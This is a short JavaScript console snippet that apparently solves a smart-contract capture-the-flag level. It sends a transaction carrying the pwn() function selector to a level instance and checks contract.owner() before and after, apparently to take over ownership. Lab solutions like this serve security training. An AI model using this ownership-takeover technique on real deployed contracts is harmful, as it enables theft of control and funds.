
// Click get new instance


// instance
// await contract.owner()

await sendTransaction({
  from: "0x46A3527e46972381340a357CA5DB4FF3Cb4b36Fa", // replace with own address
  to: "0x3952482937b7830ce95bf06514459ca561c6abcd", //instance
  data: "0xdd365b8b" // for payload, see below 
});

// use a Print contract

// or use web3
// web3.sha3("pwn()").slice(0, 10) // 0xdd365b8b

await contract.owner()